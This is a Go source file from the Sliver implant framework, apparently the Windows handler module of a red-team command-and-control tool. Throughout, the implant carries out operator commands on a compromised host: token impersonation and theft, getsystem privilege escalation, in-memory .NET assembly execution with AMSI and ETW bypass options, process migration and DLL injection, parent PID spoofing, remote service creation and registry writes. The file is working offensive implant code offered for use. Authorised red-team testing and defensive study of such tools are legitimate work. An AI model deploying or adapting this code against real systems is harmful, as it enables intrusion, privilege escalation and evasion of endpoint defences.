package handlers

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"bufio"
	"bytes"
	"fmt"
	"io"
	"os"
	"runtime"

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"os/exec"
	"syscall"

	"github.com/bishopfox/sliver/implant/sliver/extension"
	"github.com/bishopfox/sliver/implant/sliver/priv"
	"github.com/bishopfox/sliver/implant/sliver/registry"
	"github.com/bishopfox/sliver/implant/sliver/service"
	"github.com/bishopfox/sliver/implant/sliver/spoof"
	"github.com/bishopfox/sliver/implant/sliver/syscalls"
	"github.com/bishopfox/sliver/implant/sliver/taskrunner"
	"github.com/bishopfox/sliver/protobuf/commonpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"

	"golang.org/x/sys/windows"
	"google.golang.org/protobuf/proto"
)

var (
	windowsHandlers = map[uint32]RPCHandler{

		// Windows Only
		sliverpb.MsgTaskReq:                        taskHandler,
		sliverpb.MsgProcessDumpReq:                 dumpHandler,
		sliverpb.MsgImpersonateReq:                 impersonateHandler,
		sliverpb.MsgRevToSelfReq:                   revToSelfHandler,
		sliverpb.MsgRunAsReq:                       runAsHandler,
		sliverpb.MsgInvokeGetSystemReq:             getsystemHandler,
		sliverpb.MsgInvokeExecuteAssemblyReq:       executeAssemblyHandler,
		sliverpb.MsgInvokeInProcExecuteAssemblyReq: inProcExecuteAssemblyHandler,
		sliverpb.MsgInvokeMigrateReq:               migrateHandler,
		sliverpb.MsgSpawnDllReq:                    spawnDllHandler,
		sliverpb.MsgStartServiceReq:                startService,
		sliverpb.MsgStopServiceReq:                 stopService,
		sliverpb.MsgRemoveServiceReq:               removeService,
		sliverpb.MsgEnvReq:                         getEnvHandler,
		sliverpb.MsgSetEnvReq:                      setEnvHandler,
		sliverpb.MsgUnsetEnvReq:                    unsetEnvHandler,
		sliverpb.MsgExecuteWindowsReq:              executeWindowsHandler,
		sliverpb.MsgGetPrivsReq:                    getPrivsHandler,
		sliverpb.MsgCurrentTokenOwnerReq:           currentTokenOwnerHandler,

		// Platform specific
		sliverpb.MsgIfconfigReq:            ifconfigHandler,
		sliverpb.MsgScreenshotReq:          screenshotHandler,
		sliverpb.MsgSideloadReq:            sideloadHandler,
		sliverpb.MsgNetstatReq:             netstatHandler,
		sliverpb.MsgMakeTokenReq:           makeTokenHandler,
		sliverpb.MsgPsReq:                  psHandler,
		sliverpb.MsgTerminateReq:           terminateHandler,
		sliverpb.MsgRegistryReadReq:        regReadHandler,
		sliverpb.MsgRegistryWriteReq:       regWriteHandler,
		sliverpb.MsgRegistryCreateKeyReq:   regCreateKeyHandler,
		sliverpb.MsgRegistryDeleteKeyReq:   regDeleteKeyHandler,
		sliverpb.MsgRegistrySubKeysListReq: regSubKeysListHandler,
		sliverpb.MsgRegistryListValuesReq:  regValuesListHandler,

		// Generic
		sliverpb.MsgPing:           pingHandler,
		sliverpb.MsgLsReq:          dirListHandler,
		sliverpb.MsgDownloadReq:    downloadHandler,
		sliverpb.MsgUploadReq:      uploadHandler,
		sliverpb.MsgCdReq:          cdHandler,
		sliverpb.MsgPwdReq:         pwdHandler,
		sliverpb.MsgRmReq:          rmHandler,
		sliverpb.MsgMvReq:          mvHandler,
		sliverpb.MsgMkdirReq:       mkdirHandler,
		sliverpb.MsgExecuteReq:     executeHandler,
		sliverpb.MsgReconfigureReq: reconfigureHandler,
		sliverpb.MsgSSHCommandReq:  runSSHCommandHandler,
		sliverpb.MsgChtimesReq:     chtimesHandler,

		// Extensions
		sliverpb.MsgRegisterExtensionReq: registerExtensionHandler,
		sliverpb.MsgCallExtensionReq:     callExtensionHandler,
		sliverpb.MsgListExtensionsReq:    listExtensionsHandler,

		// {{if .Config.WGc2Enabled}}
		// Wireguard specific
		sliverpb.MsgWGStartPortFwdReq:   wgStartPortfwdHandler,
		sliverpb.MsgWGStopPortFwdReq:    wgStopPortfwdHandler,
		sliverpb.MsgWGListForwardersReq: wgListTCPForwardersHandler,
		sliverpb.MsgWGStartSocksReq:     wgStartSocksHandler,
		sliverpb.MsgWGStopSocksReq:      wgStopSocksHandler,
		sliverpb.MsgWGListSocksReq:      wgListSocksServersHandler,
		// {{end}}
	}
)

// GetSystemHandlers - Returns a map of the windows system handlers
func GetSystemHandlers() map[uint32]RPCHandler {
	return windowsHandlers
}

func WrapperHandler(handler RPCHandler, data []byte, resp RPCResponse) {
	if priv.CurrentToken != 0 {
		err := syscalls.ImpersonateLoggedOnUser(priv.CurrentToken)
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("Error: %v\n", err)
			// {{end}}
		}
		runtime.LockOSThread()
		defer runtime.UnlockOSThread()
	}
	handler(data, resp)
	if priv.CurrentToken != 0 {
		err := priv.TRevertToSelf()
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("Error: %v\n", err)
			// {{end}}
		}
	}
}

// ---------------- Windows Handlers ----------------

func impersonateHandler(data []byte, resp RPCResponse) {
	impersonateReq := &sliverpb.ImpersonateReq{}
	err := proto.Unmarshal(data, impersonateReq)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}
	token, err := priv.Impersonate(impersonateReq.Username)
	if err == nil {
		taskrunner.CurrentToken = token
	}
	impersonate := &sliverpb.Impersonate{}
	if err != nil {
		impersonate.Response = &commonpb.Response{Err: err.Error()}
	}
	data, err = proto.Marshal(impersonate)
	resp(data, err)
}

func runAsHandler(data []byte, resp RPCResponse) {
	runAsReq := &sliverpb.RunAsReq{}
	err := proto.Unmarshal(data, runAsReq)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}
	show := 10
	if runAsReq.HideWindow {
		show = 0
	}
	err = priv.RunAs(runAsReq.Username, runAsReq.Domain, runAsReq.Password, runAsReq.ProcessName, runAsReq.Args, show, runAsReq.NetOnly)
	runAs := &sliverpb.RunAs{}
	if err != nil {
		runAs.Response = &commonpb.Response{Err: err.Error()}
	}
	data, err = proto.Marshal(runAs)
	resp(data, err)
}

func revToSelfHandler(_ []byte, resp RPCResponse) {
	//{{if .Config.Debug}}
	log.Println("Calling revToSelf...")
	//{{end}}
	taskrunner.CurrentToken = windows.Token(0)
	err := priv.RevertToSelf()
	revToSelf := &sliverpb.RevToSelf{}
	if err != nil {
		revToSelf.Response = &commonpb.Response{Err: err.Error()}
	}
	//{{if .Config.Debug}}
	log.Println("revToSelf done!")
	//{{end}}
	data, err := proto.Marshal(revToSelf)
	resp(data, err)
}

func currentTokenOwnerHandler(data []byte, resp RPCResponse) {
	tokOwnReq := &sliverpb.CurrentTokenOwnerReq{}
	err := proto.Unmarshal(data, tokOwnReq)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}

	getCT := &sliverpb.CurrentTokenOwner{}
	owner, err := priv.CurrentTokenOwner()
	if err != nil {
		getCT.Response = &commonpb.Response{Err: err.Error()}
	}
	getCT.Output = owner
	data, err = proto.Marshal(getCT)
	resp(data, err)
}

func getsystemHandler(data []byte, resp RPCResponse) {
	getSysReq := &sliverpb.InvokeGetSystemReq{}
	err := proto.Unmarshal(data, getSysReq)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}
	err = priv.GetSystem(getSysReq.Data, getSysReq.HostingProcess)
	getSys := &sliverpb.GetSystem{}
	if err != nil {
		getSys.Response = &commonpb.Response{Err: err.Error()}
	}
	data, err = proto.Marshal(getSys)
	resp(data, err)
}

func executeAssemblyHandler(data []byte, resp RPCResponse) {
	execReq := &sliverpb.InvokeExecuteAssemblyReq{}
	err := proto.Unmarshal(data, execReq)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}
	output, err := taskrunner.ExecuteAssembly(execReq.Data, execReq.Process, execReq.ProcessArgs, execReq.PPid)
	execAsm := &sliverpb.ExecuteAssembly{Output: []byte(output)}
	if err != nil {
		execAsm.Response = &commonpb.Response{
			Err: err.Error(),
		}
	}
	data, err = proto.Marshal(execAsm)
	resp(data, err)

}

func inProcExecuteAssemblyHandler(data []byte, resp RPCResponse) {
	execReq := &sliverpb.InvokeInProcExecuteAssemblyReq{}
	err := proto.Unmarshal(data, execReq)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}
	output, err := taskrunner.InProcExecuteAssembly(execReq.Data, execReq.Arguments, execReq.Runtime, execReq.AmsiBypass, execReq.EtwBypass)
	execAsm := &sliverpb.ExecuteAssembly{Output: []byte(output)}
	if err != nil {
		execAsm.Response = &commonpb.Response{
			Err: err.Error(),
		}
	}
	data, err = proto.Marshal(execAsm)
	resp(data, err)
}

func executeWindowsHandler(data []byte, resp RPCResponse) {
	var (
		err       error
		stdErr    io.Writer
		stdOut    io.Writer
		errWriter *bufio.Writer
		outWriter *bufio.Writer
	)
	execReq := &sliverpb.ExecuteWindowsReq{}
	err = proto.Unmarshal(data, execReq)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}

	execResp := &sliverpb.Execute{}
	exePath, err := expandPath(execReq.Path)
	if err != nil {
		execResp.Response = &commonpb.Response{
			Err: fmt.Sprintf("%s", err),
		}
		proto.Marshal(execResp)
		resp(data, err)
		return
	}
	cmd := exec.Command(exePath, execReq.Args...)

	// Execute with current token
	cmd.SysProcAttr = &syscall.SysProcAttr{}
	if execReq.UseToken {
		cmd.SysProcAttr.Token = syscall.Token(priv.CurrentToken)
	}
	if execReq.PPid != 0 {
		err := spoof.SpoofParent(execReq.PPid, cmd)
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("could not spoof parent PID: %v\n", err)
			// {{end}}
		}
	}

	if execReq.Output {
		stdOutBuff := new(bytes.Buffer)
		stdErrBuff := new(bytes.Buffer)
		stdErr = stdErrBuff
		stdOut = stdOutBuff
		if execReq.Stderr != "" {
			stdErrFile, err := os.Create(execReq.Stderr)
			if err != nil {
				execResp.Response = &commonpb.Response{
					Err: fmt.Sprintf("%s", err),
				}
				proto.Marshal(execResp)
				resp(data, err)
				return
			}
			defer stdErrFile.Close()
			errWriter = bufio.NewWriter(stdErrFile)
			stdErr = io.MultiWriter(errWriter, stdErrBuff)
		}
		if execReq.Stdout != "" {
			stdOutFile, err := os.Create(execReq.Stdout)
			if err != nil {
				execResp.Response = &commonpb.Response{
					Err: fmt.Sprintf("%s", err),
				}
				proto.Marshal(execResp)
				resp(data, err)
				return
			}
			defer stdOutFile.Close()
			outWriter = bufio.NewWriter(stdOutFile)
			stdOut = io.MultiWriter(outWriter, stdOutBuff)
		}
		cmd.Stdout = stdOut
		cmd.Stderr = stdErr
		err := cmd.Run()
		//{{if .Config.Debug}}
		log.Println(string(stdOutBuff.String()))
		//{{end}}
		if err != nil {
			// Exit errors are not a failure of the RPC, but of the command.
			if exiterr, ok := err.(*exec.ExitError); ok {
				execResp.Status = uint32(exiterr.ExitCode())
			} else {
				execResp.Response = &commonpb.Response{
					Err: fmt.Sprintf("%s", err),
				}
			}
		}
		if errWriter != nil {
			errWriter.Flush()
		}
		if outWriter != nil {
			outWriter.Flush()
		}
		execResp.Stderr = stdErrBuff.Bytes()
		execResp.Stdout = stdOutBuff.Bytes()
	} else {
		err = cmd.Start()
		if err != nil {
			execResp.Response = &commonpb.Response{
				Err: fmt.Sprintf("%s", err),
			}
		}
	}
	data, err = proto.Marshal(execResp)
	resp(data, err)
}

func migrateHandler(data []byte, resp RPCResponse) {
	// {{if .Config.Debug}}
	log.Println("migrateHandler: RemoteTask called")
	// {{end}}
	migrateReq := &sliverpb.InvokeMigrateReq{}
	err := proto.Unmarshal(data, migrateReq)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}
	err = taskrunner.RemoteTask(int(migrateReq.Pid), migrateReq.Data, false)
	// {{if .Config.Debug}}
	log.Println("migrateHandler: RemoteTask called")
	// {{end}}
	migrateResp := &sliverpb.Migrate{Success: true}
	if err != nil {
		migrateResp.Success = false
		migrateResp.Response = &commonpb.Response{
			Err: err.Error(),
		}
		// {{if .Config.Debug}}
		log.Println("migrateHandler: RemoteTask failed:", err)
		// {{end}}
	}
	data, err = proto.Marshal(migrateResp)
	resp(data, err)
}

func spawnDllHandler(data []byte, resp RPCResponse) {
	spawnReq := &sliverpb.SpawnDllReq{}
	err := proto.Unmarshal(data, spawnReq)

	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}
	//{{if .Config.Debug}}
	log.Printf("ProcName: %s\tOffset:%x\tArgs:%s\n", spawnReq.GetProcessName(), spawnReq.GetOffset(), spawnReq.GetArgs())
	//{{end}}
	result, err := taskrunner.SpawnDll(spawnReq.GetProcessName(), spawnReq.GetProcessArgs(), spawnReq.GetPPid(), spawnReq.GetData(), spawnReq.GetOffset(), spawnReq.GetArgs(), spawnReq.Kill)
	spawnResp := &sliverpb.SpawnDll{Result: result}
	if err != nil {
		spawnResp.Response = &commonpb.Response{
			Err: err.Error(),
		}
	}

	data, err = proto.Marshal(spawnResp)
	resp(data, err)
}

func makeTokenHandler(data []byte, resp RPCResponse) {
	makeTokenReq := &sliverpb.MakeTokenReq{}
	err := proto.Unmarshal(data, makeTokenReq)
	if err != nil {
		return
	}
	makeTokenResp := &sliverpb.MakeToken{}
	err = priv.MakeToken(makeTokenReq.Domain, makeTokenReq.Username, makeTokenReq.Password, makeTokenReq.LogonType)
	if err != nil {
		makeTokenResp.Response = &commonpb.Response{
			Err: err.Error(),
		}
	}
	data, err = proto.Marshal(makeTokenResp)
	resp(data, err)
}

func startService(data []byte, resp RPCResponse) {
	startService := &sliverpb.StartServiceReq{}
	err := proto.Unmarshal(data, startService)
	if err != nil {
		return
	}
	err = service.StartService(startService.GetHostname(), startService.GetBinPath(), startService.GetArguments(), startService.GetServiceName(), startService.GetServiceDescription())
	startServiceResp := &sliverpb.ServiceInfo{}
	if err != nil {
		startServiceResp.Response = &commonpb.Response{
			Err: err.Error(),
		}
	}
	data, err = proto.Marshal(startServiceResp)
	resp(data, err)
}

func stopService(data []byte, resp RPCResponse) {
	stopServiceReq := &sliverpb.StopServiceReq{}
	err := proto.Unmarshal(data, stopServiceReq)
	if err != nil {
		return
	}
	err = service.StopService(stopServiceReq.ServiceInfo.Hostname, stopServiceReq.ServiceInfo.ServiceName)
	svcInfo := &sliverpb.ServiceInfo{}
	if err != nil {
		svcInfo.Response = &commonpb.Response{
			Err: err.Error(),
		}
	}
	data, err = proto.Marshal(svcInfo)
	resp(data, err)
}

func removeService(data []byte, resp RPCResponse) {
	removeServiceReq := &sliverpb.RemoveServiceReq{}
	err := proto.Unmarshal(data, removeServiceReq)
	if err != nil {
		return
	}
	err = service.RemoveService(removeServiceReq.ServiceInfo.Hostname, removeServiceReq.ServiceInfo.ServiceName)
	svcInfo := &sliverpb.ServiceInfo{}
	if err != nil {
		svcInfo.Response = &commonpb.Response{
			Err: err.Error(),
		}
	}
	data, err = proto.Marshal(svcInfo)
	resp(data, err)
}

func regWriteHandler(data []byte, resp RPCResponse) {
	regWriteReq := &sliverpb.RegistryWriteReq{}
	err := proto.Unmarshal(data, regWriteReq)
	if err != nil {
		return
	}
	var val interface{}
	switch regWriteReq.Type {
	case sliverpb.RegistryTypeBinary:
		val = regWriteReq.ByteValue
	case sliverpb.RegistryTypeDWORD:
		val = regWriteReq.DWordValue
	case sliverpb.RegistryTypeQWORD:
		val = regWriteReq.QWordValue
	case sliverpb.RegistryTypeString:
		val = regWriteReq.StringValue
	default:
		return
	}
	err = registry.WriteKey(regWriteReq.Hostname, regWriteReq.Hive, regWriteReq.Path, regWriteReq.Key, val)
	regWriteResp := &sliverpb.RegistryWrite{
		Response: &commonpb.Response{},
	}
	if err != nil {
		regWriteResp.Response.Err = err.Error()
	}
	data, err = proto.Marshal(regWriteResp)
	resp(data, err)
}

func regReadHandler(data []byte, resp RPCResponse) {
	regReadReq := &sliverpb.RegistryReadReq{}
	err := proto.Unmarshal(data, regReadReq)
	if err != nil {
		return
	}
	res, err := registry.ReadKey(regReadReq.Hostname, regReadReq.Hive, regReadReq.Path, regReadReq.Key)
	regReadResp := &sliverpb.RegistryRead{
		Value:    res,
		Response: &commonpb.Response{},
	}
	if err != nil {
		regReadResp.Response.Err = err.Error()
	}
	data, err = proto.Marshal(regReadResp)
	resp(data, err)
}

func regCreateKeyHandler(data []byte, resp RPCResponse) {
	createReq := &sliverpb.RegistryCreateKeyReq{}
	err := proto.Unmarshal(data, createReq)
	if err != nil {
		return
	}
	err = registry.CreateSubKey(createReq.Hostname, createReq.Hive, createReq.Path, createReq.Key)
	createResp := &sliverpb.RegistryCreateKey{
		Response: &commonpb.Response{},
	}
	if err != nil {
		createResp.Response.Err = err.Error()
	}
	data, err = proto.Marshal(createResp)
	resp(data, err)
}

func regDeleteKeyHandler(data []byte, resp RPCResponse) {
	deleteReq := &sliverpb.RegistryDeleteKeyReq{}
	err := proto.Unmarshal(data, deleteReq)
	if err != nil {
		return
	}
	err = registry.DeleteKey(deleteReq.Hostname, deleteReq.Hive, deleteReq.Path, deleteReq.Key)
	deleteResp := &sliverpb.RegistryDeleteKey{
		Response: &commonpb.Response{},
	}
	if err != nil {
		deleteResp.Response.Err = err.Error()
	}
	data, err = proto.Marshal(deleteResp)
	resp(data, err)
}

func regSubKeysListHandler(data []byte, resp RPCResponse) {
	listReq := &sliverpb.RegistrySubKeyListReq{}
	err := proto.Unmarshal(data, listReq)
	if err != nil {
		return
	}
	subKeys, err := registry.ListSubKeys(listReq.Hostname, listReq.Hive, listReq.Path)
	regListResp := &sliverpb.RegistrySubKeyList{
		Response: &commonpb.Response{},
	}
	if err != nil {
		regListResp.Response.Err = err.Error()
	} else {
		regListResp.Subkeys = subKeys
	}
	data, err = proto.Marshal(regListResp)
	resp(data, err)
}

func regValuesListHandler(data []byte, resp RPCResponse) {
	listReq := &sliverpb.RegistryListValuesReq{}
	err := proto.Unmarshal(data, listReq)
	if err != nil {
		return
	}
	regValues, err := registry.ListValues(listReq.Hostname, listReq.Hive, listReq.Path)
	regListResp := &sliverpb.RegistryValuesList{
		Response: &commonpb.Response{},
	}
	if err != nil {
		regListResp.Response.Err = err.Error()
	} else {
		regListResp.ValueNames = regValues
	}
	data, err = proto.Marshal(regListResp)
	resp(data, err)
}

func getPrivsHandler(data []byte, resp RPCResponse) {
	createReq := &sliverpb.GetPrivsReq{}

	err := proto.Unmarshal(data, createReq)
	if err != nil {
		return
	}

	privsInfo, integrity, processName, err := priv.GetPrivs()

	response_data := make([]*sliverpb.WindowsPrivilegeEntry, len(privsInfo))

	/*
		Translate the PrivilegeInfo structs into
		sliverpb.WindowsPrivilegeEntry structs and put them in the data
		that will go back to the server / client
	*/
	for index, entry := range privsInfo {
		var currentEntry sliverpb.WindowsPrivilegeEntry

		currentEntry.Name = entry.Name
		currentEntry.Description = entry.Description
		currentEntry.Enabled = entry.Enabled
		currentEntry.EnabledByDefault = entry.EnabledByDefault
		currentEntry.Removed = entry.Removed
		currentEntry.UsedForAccess = entry.UsedForAccess

		response_data[index] = &currentEntry
	}

	// Package up the response
	getPrivsResp := &sliverpb.GetPrivs{
		PrivInfo:         response_data,
		ProcessIntegrity: integrity,
		ProcessName:      processName,
		Response:         &commonpb.Response{},
	}

	if err != nil {
		getPrivsResp.Response.Err = err.Error()
	}

	data, err = proto.Marshal(getPrivsResp)
	resp(data, err)
}

// Extensions

func registerExtensionHandler(data []byte, resp RPCResponse) {
	registerReq := &sliverpb.RegisterExtensionReq{}
	err := proto.Unmarshal(data, registerReq)
	if err != nil {
		return
	}
	ext := extension.NewWindowsExtension(registerReq.Data, registerReq.Name, registerReq.OS, registerReq.Init)
	err = ext.Load()
	registerResp := &sliverpb.RegisterExtension{Response: &commonpb.Response{}}
	if err != nil {
		registerResp.Response.Err = err.Error()
	} else {
		extension.Add(ext)
	}
	data, err = proto.Marshal(registerResp)
	resp(data, err)
}

func callExtensionHandler(data []byte, resp RPCResponse) {
	callReq := &sliverpb.CallExtensionReq{}
	err := proto.Unmarshal(data, callReq)
	if err != nil {
		return
	}

	callResp := &sliverpb.CallExtension{Response: &commonpb.Response{}}
	gotOutput := false
	err = extension.Run(callReq.Name, callReq.Export, callReq.Args, func(out []byte) {
		gotOutput = true
		callResp.Output = out
		data, err = proto.Marshal(callResp)
		resp(data, err)
	})
	// Only send back synchronously if there was an error
	if err != nil || !gotOutput {
		if err != nil {
			callResp.Response.Err = err.Error()
		}
		data, err = proto.Marshal(callResp)
		resp(data, err)
	}
}

func listExtensionsHandler(data []byte, resp RPCResponse) {
	lstReq := &sliverpb.ListExtensionsReq{}
	err := proto.Unmarshal(data, lstReq)
	if err != nil {
		return
	}

	exts := extension.List()
	lstResp := &sliverpb.ListExtensions{
		Response: &commonpb.Response{},
		Names:    exts,
	}
	data, err = proto.Marshal(lstResp)
	resp(data, err)
}

// Stub since Windows doesn't support UID
func getUid(fileInfo os.FileInfo) (string) {
	return ""
}

// Stub since Windows doesn't support GID
func getGid(fileInfo os.FileInfo) (string) {
    return ""
}
